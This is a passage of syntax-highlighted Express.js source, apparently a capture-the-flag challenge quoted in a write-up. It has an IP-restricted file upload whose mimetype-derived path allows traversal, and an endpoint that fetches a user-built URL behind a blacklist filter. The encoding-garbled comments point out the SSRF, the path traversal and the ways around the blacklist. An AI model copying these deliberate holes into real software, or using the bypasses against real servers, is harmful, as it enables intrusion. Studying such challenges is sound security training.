&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">action&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;.pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">renderFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ¨¡æ¿æ¸²æŸ“
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/file_upload&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// éœ€è¦SSRF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;only admin&amp;#39;s ip can use it&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/uploads/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">mimetype&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// è·¯å¾„ç¡®å®š mimetypeå¯æ§ è·¯å¾„ç©¿è¶Š
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">originalname&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">dir_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;file type error&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir_file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload success&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">file_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">file_name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">msg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;upload failed&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">obj&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æºç 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/template/source.txt&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// qå‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/source?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#75715e">// å¯æ§ç«¯ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// é»‘åå•è¿‡æ»¤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;error occurs!&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// urlencodeç»•è¿‡ å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ unicodeç»•è¿‡
